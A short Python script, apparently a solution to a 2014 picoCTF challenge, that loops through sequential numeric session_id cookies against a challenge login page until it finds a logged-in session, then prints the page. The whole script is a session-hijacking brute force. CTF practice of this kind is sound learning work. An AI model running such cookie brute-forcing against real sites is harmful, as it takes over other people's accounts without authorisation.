import requests, sys, urllib2

SERVER = "http://web2014.picoctf.com/delicious-5850932/login.php"

output = requests.get(SERVER)
cookieNum = 0
while "not logged in" in output.content or "expired" in output.content:
    cookie = {"session_id": str(cookieNum)}
    output = requests.get(SERVER, cookies=cookie)
    cookieNum += 1

print output.content
